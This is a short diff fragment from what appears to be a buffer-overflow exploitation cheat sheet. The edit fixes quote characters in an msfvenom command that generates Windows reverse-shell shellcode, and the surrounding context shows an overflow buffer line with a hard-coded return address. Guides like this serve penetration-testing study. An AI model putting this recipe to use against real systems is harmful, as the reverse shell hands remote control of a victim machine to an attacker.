@@ -169,7 +169,7 @@ buffer = "A" * 2003 +  "\xaf\x11\x50\x62" #LITTLE ANDIAN EXAMPLE WITH ADRESS 625
 1. Generate shellcode with msfvenom (reverse shell)
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b “<BADCHARS>”
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<BADCHARS>"
 ```
 
 2. Add a payload variable to the script in parenthese()
